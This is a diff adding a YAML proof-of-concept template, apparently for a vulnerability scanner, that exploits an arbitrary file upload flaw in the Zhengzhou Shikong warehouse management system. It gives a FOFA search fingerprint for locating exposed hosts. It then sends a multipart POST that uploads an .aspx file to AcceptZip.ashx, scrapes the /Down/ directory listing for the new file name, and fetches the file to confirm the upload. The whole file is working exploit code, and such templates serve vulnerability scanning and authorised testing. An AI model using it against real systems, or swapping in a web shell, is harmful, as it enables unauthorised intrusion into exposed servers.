@@ -1,0 +1,36 @@
+id: poc-yaml-zzskzy-wms-acceptzip-anyfile-upload
+info:
+  name: 郑州时空 仓储精细化管理系统 AcceptZip 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 仓储精细化管理系统
+  fofa: body="SKControlKLForJson.ashx"
+variables:
+  t1: random_str(16)
+  t2: datetime("15:04")
+requests:
+- method: POST
+  path: /AcceptZip.ashx
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+  data: '------WebKitFormBoundaryssh7UfnPpGU7BXfK
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: text/plain
+
+
+    {{.t1}}
+
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--'
+  expression: status_code == 200 && body == "success"
+- method: GET
+  path: /Down/
+  expression: status_code == 200
+  output:
+  - regex_match(body,t2 + `           16 <A HREF="/Down/(?P<file>[0-9.]+).aspx`)
+- method: GET
+  path: /Down/{{.file}}.aspx
+  expression: status_code == 200 && body == t1
+transport: http
